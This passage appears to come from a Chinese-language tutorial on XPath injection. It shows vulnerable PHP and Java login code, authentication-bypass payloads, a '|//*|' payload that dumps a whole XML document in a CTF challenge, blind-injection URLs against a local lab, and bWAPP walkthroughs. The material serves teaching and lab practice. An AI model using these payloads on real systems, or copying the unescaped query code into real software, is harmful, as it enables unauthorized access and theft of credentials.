<span class="hljs-variable">$result</span> = <span class="hljs-variable">$xml</span>-&gt;<span class="hljs-title function_ invoke__">xpath</span>(<span class="hljs-variable">$query</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>) {
    <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;h2&gt;Welcome&lt;/h2&gt;'</span>;
    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) {
        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;br /&gt;ID:'</span>.<span class="hljs-variable">$value</span>-&gt;id;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;br /&gt;Username:'</span>.<span class="hljs-variable">$value</span>-&gt;username;
    }
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>代码很简单,实现了一个简单的登陆验证功能.其实和SQL注入相似,没有对用户输入的数据做过滤,导致攻击者可以直接注入”XPath表达式”，只要知道用户名就能绕过密码验证.</p>
<pre><code class="hljs plaintext">payload:
?name=admin' or '1'='1&amp;pwd=''</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230505103401599.png" alt="image-20230505103401599"></p>
<p>如果用户名没法得知,可以用两个”or”来绕过验证逻辑</p>
<pre><code class="hljs plaintext">payload:
?name=fake' or '1' or '1&amp;pwd=fake</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230505105940261.png" alt="image-20230505105940261"></p>
<h3 id="xpath实例二"><strong>Xpath实例二</strong></h3>
<p>这里用一道赛题来举例：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
  <span class="hljs-variable">$re</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">'and'</span>,<span class="hljs-string">'or'</span>,<span class="hljs-string">'count'</span>,<span class="hljs-string">'select'</span>,<span class="hljs-string">'from'</span>,<span class="hljs-string">'union'</span>,<span class="hljs-string">'group'</span>,<span class="hljs-string">'by'</span>,<span class="hljs-string">'limit'</span>,<span class="hljs-string">'insert'</span>,<span class="hljs-string">'where'</span>,<span class="hljs-string">'order'</span>,<span class="hljs-string">'alter'</span>,<span class="hljs-string">'delete'</span>,<span class="hljs-string">'having'</span>,<span class="hljs-string">'max'</span>,<span class="hljs-string">'min'</span>,<span class="hljs-string">'avg'</span>,<span class="hljs-string">'sum'</span>,<span class="hljs-string">'sqrt'</span>,<span class="hljs-string">'rand'</span>,<span class="hljs-string">'concat'</span>,<span class="hljs-string">'sleep'</span>);
<span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">'injection'</span>,<span class="hljs-string">'c3FsaSBpcyBub3QgdGhlIG9ubHkgd2F5IGZvciBpbmplY3Rpb24='</span>,<span class="hljs-title function_ invoke__">time</span>()+<span class="hljs-number">100000</span>);
 
<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">'t3stt3st.xml'</span>)) {
     <span class="hljs-variable">$xml</span> = <span class="hljs-title function_ invoke__">simplexml_load_file</span>(<span class="hljs-string">'t3stt3st.xml'</span>);
     <span class="hljs-variable">$user</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'user'</span>];
     <span class="hljs-variable">$user</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$re</span>, <span class="hljs-string">' '</span>, <span class="hljs-variable">$user</span>);
     <span class="hljs-comment">//$user=str_replace("'", "&amp;apos", $user);</span>
     <span class="hljs-variable">$query</span>=<span class="hljs-string">"user/username[@name='"</span>.<span class="hljs-variable">$user</span>.<span class="hljs-string">"']"</span>;
     <span class="hljs-variable">$ans</span> = <span class="hljs-variable">$xml</span>-&gt;<span class="hljs-title function_ invoke__">xpath</span>(<span class="hljs-variable">$query</span>);
     <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$ans</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$x_value</span>)
     {
         <span class="hljs-keyword">echo</span> <span class="hljs-variable">$x</span>.<span class="hljs-string">":  "</span> . <span class="hljs-variable">$x_value</span>;
         <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br /&gt;"</span>;
 
      }
 
 }</code></pre>
<p>​		通过访问/download.php?file=backup.zip下载网页源码，首先看到他过滤了sql注入的一些关键字，setcookie中有一段base64加密的密文，解码后得到的是：“sqli is not the only way for  injection”，根据提示sql不是唯一的注入方式，再结合下面对xml的一系列操作，可以确定这道题是用xpath注入，于是根据$query=“user/username[@name='”.$user.“']”;这一句可构造如下payload:</p>
<pre><code class="hljs plaintext">$query="user/username[@name='']|//*|ss['']";</code></pre>
<p>这个payload中的   |ss  不太懂…</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230505110453042.png" alt="image-20230505110453042"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230505110458378.png" alt="image-20230505110458378"></p>
<p>这句payload的意思是闭合了“.$user.”前后的单引号同时执行三个操作，其中第二个操作//*即是关键点，列出文档中的所有元素，最后拿到flag</p>
<p>浅浅分析一下:	这里用|的原因是为了让该查询语句返回true,因为,user前后均为假,而  //*  会返回文档所有元素,因此为真</p>
<h3 id="xpath-实列原理三">xpath 实列原理三</h3>
<p>这边有个存放分数的xml文件：</p>
<p><strong>score.xml:</strong></p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">class</span> <span class="hljs-attr">num</span>=<span class="hljs-string">'1'</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">peo</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'tom'</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">subject</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span>english<span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">score</span>&gt;</span>60<span class="hljs-tag">&lt;/<span class="hljs-name">score</span>&gt;</span>
                        <span class="hljs-tag">&lt;/<span class="hljs-name">subject</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">subject</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span>chinese<span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">score</span>&gt;</span>70<span class="hljs-tag">&lt;/<span class="hljs-name">score</span>&gt;</span>
                        <span class="hljs-tag">&lt;/<span class="hljs-name">subject</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>qwer123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">peo</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">peo</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'helen'</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">subject</span>&gt;</span> 
                                <span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span>english<span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">score</span>&gt;</span>24<span class="hljs-tag">&lt;/<span class="hljs-name">score</span>&gt;</span>
                        <span class="hljs-tag">&lt;/<span class="hljs-name">subject</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">subject</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span>chinese<span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">score</span>&gt;</span>34<span class="hljs-tag">&lt;/<span class="hljs-name">score</span>&gt;</span>
                        <span class="hljs-tag">&lt;/<span class="hljs-name">subject</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>woaichishi<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">peo</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">peo</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'vk'</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">subject</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span>english<span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">score</span>&gt;</span>100<span class="hljs-tag">&lt;/<span class="hljs-name">score</span>&gt;</span>
                        <span class="hljs-tag">&lt;/<span class="hljs-name">subject</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">subject</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span>chinese<span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">score</span>&gt;</span>100<span class="hljs-tag">&lt;/<span class="hljs-name">score</span>&gt;</span>
                        <span class="hljs-tag">&lt;/<span class="hljs-name">subject</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>vk123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">peo</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></code></pre>
<p>查询分数的php是：</p>
<p><strong>score.php</strong></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">'score.xml'</span>)){
        <span class="hljs-variable">$xml</span> = <span class="hljs-title function_ invoke__">simplexml_load_file</span>(<span class="hljs-string">'score.xml'</span>);  <span class="hljs-comment">//获取xml文件里面的数据</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'user'</span>])){
                <span class="hljs-variable">$user</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'user'</span>];
 
                <span class="hljs-comment">//构造语句</span>
                <span class="hljs-variable">$en_scr</span> = <span class="hljs-string">"//peo[@name='<span class="hljs-subst">{$user}</span>']/subject[contains(foo, 'english')]/score"</span>;
                <span class="hljs-variable">$ch_scr</span> = <span class="hljs-string">"//peo[@name='<span class="hljs-subst">{$user}</span>']/subject[contains(foo, 'chinese')]/score"</span>;
                <span class="hljs-variable">$en_qu</span> = <span class="hljs-variable">$xml</span> -&gt; <span class="hljs-title function_ invoke__">xpath</span>(<span class="hljs-variable">$en_scr</span>);
                <span class="hljs-variable">$ch_qu</span> = <span class="hljs-variable">$xml</span> -&gt; <span class="hljs-title function_ invoke__">xpath</span>(<span class="hljs-variable">$ch_scr</span>);
                <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$en_qu</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) {
                        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$user</span>.<span class="hljs-string">':&lt;br&gt;english is '</span>.<span class="hljs-variable">$value</span>;
                }
                <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$ch_qu</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) {
                        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;br&gt;'</span>.<span class="hljs-string">'chinese is '</span>.<span class="hljs-variable">$value</span>;
                }
        }<span class="hljs-keyword">else</span>{
                <span class="hljs-keyword">echo</span> <span class="hljs-string">'only have three user: vk, tom, helen.'</span>;
        }
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里，php用simplexml_load_file()这个函数来访问那个存分数的xml文件,然后用xpath语法去查询数据。会php语言的慢慢看（重要！可加深理解），不会的跳过，先看效果：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230505120216563.png" alt="image-20230505120216563"></p>
<p>他说只有三个用户，那我们来查查helen的分数吧</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230505120242866.png" alt="image-20230505120242866"></p>
<p>好了，反过来看看代码，它是怎么实现对xml文件的查询的？</p>
<pre><code class="hljs plaintext">$en_scr = "//peo[@name='{$user}']/subject[contains(foo, 'english')]/score";
$ch_scr = "//peo[@name='{$user}']/subject[contains(foo, 'chinese')]/score";</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230505120322832.png" alt="image-20230505120322832"></p>
<pre><code>图中框这个就相当于Sql中的语句，这就是xpath路径选取xml节点的语句。
</code></pre>
<p>直接解释查询语句/peo 匹配到所有peo节点</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230505120349463.png" alt="image-20230505120349463"></p>
<pre><code class="hljs plaintext">这节点不止一个，到底要哪个呢？
[@name='{$user}']    接收到用户名字，来查询相应的节点（就是刚才的helen,vk）
/subject             刚才peo节点下的subject节点

这时候问题又来了，subject节点不止一个，哪个呢？
[contains(foo, 'english')]   contains函数，第一个参数给出节点名，第二个写字符串意思就是，匹配出他的foo子节点中，信息含有english的那个/score 已经找到相应的subject了，然后就是找分数了。Score就是存放分数的节点：</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230505120452883.png" alt="image-20230505120452883"></p>
<p>这样就能实现从xml文件中查询相应数据了!</p>
<h2 id="0x07-xpath盲注的方法">0x07 XPath盲注的方法</h2>
<p>盲注主要利用XPath的一些字符串操作函数和运算符.</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230505142444293.png" alt="image-20230505142444293"></p>
<p>以前文的环境为例,如果我们想遍历出整个XML文档,一般步骤如下:</p>
<p><strong>1.判断根下节点数:(体现出来的就是回显正常,以下均是)</strong></p>
<pre><code class="hljs plaintext">127.0.0.1/xpath/index.php?name=1' or count(/*)=1 or '1'='1&amp;pwd=fake

result: 1</code></pre>
<p><strong>2.猜解第一级节点:</strong></p>
<pre><code class="hljs plaintext">127.0.0.1/xpath/index.php?name=1' or substring(name(/*[position()=1]),1,1)='r' or '1'='1&amp;pwd=fake
127.0.0.1/xpath/index.php?name=1' or substring(name(/*[position()=1]),2,1)='o' or '1'='1&amp;pwd=fake
...
result: root</code></pre>
<p><strong>3.判断root的下一级节点数:</strong></p>
<pre><code class="hljs plaintext">127.0.0.1/xpath/index.php?name=1' or count(/root/*)=2 or '1'='1&amp;pwd=fake

result: 2</code></pre>
<p><strong>4.猜解root的下一级节点:</strong></p>
<pre><code class="hljs plaintext">127.0.0.1/xpath/index.php?name=1' or substring(name(/root/*[position()=1]),1,1)='u' or '1'='1&amp;pwd=fake
127.0.0.1/xpath/index.php?name=1' or substring(name(/root/*[position()=2]),1,1)='s' or '1'='1&amp;pwd=fake

result: users,secret</code></pre>
<p>重复上述步骤直到猜解出所有节点，最后来猜解节点中的数据或属性值。</p>
<p><strong>5、猜解id为1的user节点下的username值,</strong></p>
<pre><code class="hljs plaintext">127.0.0.1/xpath/index.php?name=1' or substring(/root/users/user[id=1]/username,1,1)='a' or '1'='1&amp;pwd=fake

...

result: admin</code></pre>
<h2 id="0x08-xpath攻击的实列">0x08 XPath攻击的实列</h2>
<p>一般说来，大多数 Web 应用程序使用关系数据库存储和检索信息。例如，如果您的 Web 站点需要身份验证，那么您可能拥有一个 users 表，其中包含惟一 ID、登录名、密码，也许还有一些其他信息，比如角色。从 users 表中检索用户的 SQL 查询可能类似于清单 1。<br>
<strong>清单 1从 users 表中检索用户的 SQL 查询</strong></p>
<pre><code class="hljs plaintext">Select * from users where loginID=’foo’ and password=’bar’</code></pre>
<p>在这个查询中，用户必须提供 loginID 和 password 作为输入。</p>
<p>如果攻击者在 loginID 字段中输入：’ or 1=1 ,并在 password 中输入：’ or 1=1</p>
<p>则形成的查询将类似清单 2。</p>
<p><strong>清单 2. 从攻击者输入形成的查询</strong></p>
<pre><code class="hljs plaintext">Select * from users where loginID = ’’ or 1=1 and password=’ ’ or 1=1</code></pre>
<p>这个条件会一直匹配，因此攻击者可以进入系统。</p>
<p>XPath 注入的原理大体类似。但是，假设您拥有的不是一个 users 表，而是一个 XML 文件，其中包含了如清单 3 所示的用户信息。</p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span>?&gt;</span> 
<span class="hljs-tag">&lt;<span class="hljs-name">users</span>&gt;</span> 
    <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span> 
        <span class="hljs-tag">&lt;<span class="hljs-name">firstname</span>&gt;</span>Ben<span class="hljs-tag">&lt;/<span class="hljs-name">firstname</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">lastname</span>&gt;</span>Elmore<span class="hljs-tag">&lt;/<span class="hljs-name">lastname</span>&gt;</span> 
        <span class="hljs-tag">&lt;<span class="hljs-name">loginID</span>&gt;</span>abc<span class="hljs-tag">&lt;/<span class="hljs-name">loginID</span>&gt;</span> 
        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>test123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span> 
    <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span> 
    <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span> 
        <span class="hljs-tag">&lt;<span class="hljs-name">firstname</span>&gt;</span>Shlomy<span class="hljs-tag">&lt;/<span class="hljs-name">firstname</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">lastname</span>&gt;</span>Gantz<span class="hljs-tag">&lt;/<span class="hljs-name">lastname</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">loginID</span>&gt;</span>xyz<span class="hljs-tag">&lt;/<span class="hljs-name">loginID</span>&gt;</span> 
        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123test<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span> 
    <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span> 
    <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span> 
        <span class="hljs-tag">&lt;<span class="hljs-name">firstname</span>&gt;</span>Jeghis<span class="hljs-tag">&lt;/<span class="hljs-name">firstname</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">lastname</span>&gt;</span>Katz<span class="hljs-tag">&lt;/<span class="hljs-name">lastname</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">loginID</span>&gt;</span>mrj<span class="hljs-tag">&lt;/<span class="hljs-name">loginID</span>&gt;</span> 
        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>jk2468<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span> 
    <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span> 
    <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span> 
        <span class="hljs-tag">&lt;<span class="hljs-name">firstname</span>&gt;</span>Darien<span class="hljs-tag">&lt;/<span class="hljs-name">firstname</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">lastname</span>&gt;</span>Heap<span class="hljs-tag">&lt;/<span class="hljs-name">lastname</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">loginID</span>&gt;</span>drano<span class="hljs-tag">&lt;/<span class="hljs-name">loginID</span>&gt;</span> 
        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>2mne8s<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span> 
    <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span> 
<span class="hljs-tag">&lt;/<span class="hljs-name">users</span>&gt;</span></code></pre>
<p>在 XPath 中，类似于 SQL 查询的语句如清单 4 所示。</p>
<p><strong>清单 4. 匹配 SQL 查询的 XPath 语句</strong></p>
<pre><code class="hljs plaintext">//users/user[loginID/text()=’abc’ and password/text()=’test123’]</code></pre>
<p>要执行类似的攻击以绕过身份验证，如果攻击者在 loginID 字段中输入：’ or 1=1 并在 password 中输入：’ or 1=1</p>
<p>您可能会使用类似清单 5 的方法。</p>
<p><strong>清单 5. 绕过身份验证</strong></p>
<pre><code class="hljs plaintext">//users/user[LoginID/text()=’’ or 1=1 and password/text()=’’ or 1=1]</code></pre>
<p>您可能在 Java 应用程序中有一个诸如 doLogin 之类的方法，使用清单 3 中的 XML 文档再次执行身份验证。可能类似于清单 6。</p>
<p><strong>清单 6. XPathInjection.java</strong></p>
<pre><code class="hljs java"> <span class="hljs-keyword">import</span> java.io.IOException;
 <span class="hljs-keyword">import</span> org.w3c.dom.*;
 <span class="hljs-keyword">import</span> org.xml.sax.SAXException;
 <span class="hljs-keyword">import</span> javax.xml.parsers.*;
 <span class="hljs-keyword">import</span> javax.xml.xpath.*;
 
 <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">XpathInjectionExample</span> {
 <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">doLogin</span><span class="hljs-params">(String loginID, String password)</span>
 
 <span class="hljs-keyword">throws</span> ParserConfigurationException, SAXException,IOException, 
 
 XPathExpressionException {
 
    <span class="hljs-type">DocumentBuilderFactory</span> <span class="hljs-variable">domFactory</span> <span class="hljs-operator">=</span> DocumentBuilderFactory.newInstance();
    domFactory.setNamespaceAware(<span class="hljs-literal">true</span>);
    <span class="hljs-type">DocumentBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> domFactory.newDocumentBuilder();
    <span class="hljs-type">Document</span> <span class="hljs-variable">doc</span> <span class="hljs-operator">=</span> builder.parse(<span class="hljs-string">"users.xml"</span>);
    <span class="hljs-type">XPathFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> XPathFactory.newInstance();
    <span class="hljs-type">XPath</span> <span class="hljs-variable">xpath</span> <span class="hljs-operator">=</span> factory.newXPath();
    <span class="hljs-type">XPathExpression</span> <span class="hljs-variable">expr</span> <span class="hljs-operator">=</span> xpath.compile(<span class="hljs-string">"//users/user[loginID/text()=’"</span>+loginID+<span class="hljs-string">"’ and password/text()=’"</span>+password+<span class="hljs-string">"’ ]/firstname/text()"</span>);
    
    <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> expr.evaluate(doc, XPathConstants.NODESET);
    <span class="hljs-type">NodeList</span> <span class="hljs-variable">nodes</span> <span class="hljs-operator">=</span> (NodeList) result;
    <span class="hljs-comment">//print first names to the console </span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; nodes.getLength(); i++) {
        System.out.println(nodes.item(i).getNodeValue());
    }
    <span class="hljs-keyword">if</span> (nodes.getLength() &gt;= <span class="hljs-number">1</span>) { 
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }<span class="hljs-keyword">else</span>{
 
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
 
   }
}</code></pre>
<h2 id="0x09-xpath之bwapp实例一">0x09 xpath之bwapp实例一</h2>
<p>我们来看看bwapp上的第一个xpath注入</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230506001448423.png" alt="image-20230506001448423"></p>
<p>这个登录界面访问权限是通过xpath去读取xml文件来实现的。换句话说，你输入账号密码，他就把xml文件里的合法账号密码拿出来和你填写的进行比对，如果一致就通过。如果他对输入没有进行过滤的话用sql注入的万能钥匙是能通过的！</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230506001616192.png" alt="image-20230506001616192"></p>
<p>通过这个我们了解到，xpath和sql注入还是有点像的，起码or能用。</p>
<p><strong>进阶探索</strong><br>
看一道xpath注入的ctf题目：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img-blog.csdnimg.cn/20190814090317921.png" alt="img"></p>
<p>在cookie中找到提示信息:意思是sqli不是唯一的注入-&gt;因此我们想到Xpath注入</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230506001820582.png" alt="image-20230506001820582"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230506001912625.png" alt="image-20230506001912625"></p>
<p>用 user1’ or ‘’=’这样爆出所有user查询结果，并不能找到flag，看来只能拿出xpath特有的注入手段了（这也是和sql注入最大的区分）直接看exp：xmltest.php?user=user1’] | //* | //*[’</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230506001943079.png" alt="image-20230506001943079"></p>
<p>好了，这一部分只需要了解xpath注入和sql注入不是一个东西就行。</p>
<h2 id="0x10-xpath之bwapp实例二">0x10 XPath之bwapp实例二</h2>
<p>再来看看bwapp的第二个xpath注入</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230506002144098.png" alt="image-20230506002144098"></p>
<p>这个web应用是，你给出类型，他查找这个类型的电影，给你呈现出来。这里我选了action动作片，他告诉我图中结果。看url就知道，这里是通过get来传参的。简单测试下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230506002341612.png" alt="image-20230506002341612"></p>
<p>语句：genre=action’ and  ‘’=‘&amp;action=search没有回显，（正常应该有回显）看样子是接收参数的位置问题，不是任何位置都可以接受and  or（比如在函数里）那我们试试：genre=action’ | //* | ’ &amp;action=search</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230506002420257.png" alt="image-20230506002420257"></p>
<p>继续：genre=action’] | //* | //*[’ &amp;action=search</p>
<p>还是不行，不要灰心，拼字游戏就是如此。<br>
我们来看看一个查询语句：//peo[@name=‘{$user}’]/subject[contains(foo, ‘chinese’)]/score<br>
这是之前查分数的XPath，这里接收参数的位置是在中括号里面，用来挑选某个节点属性，因此用中括号闭合成功，这里不行会不会是哪个函数里面接收参数？那就是括号！</p>
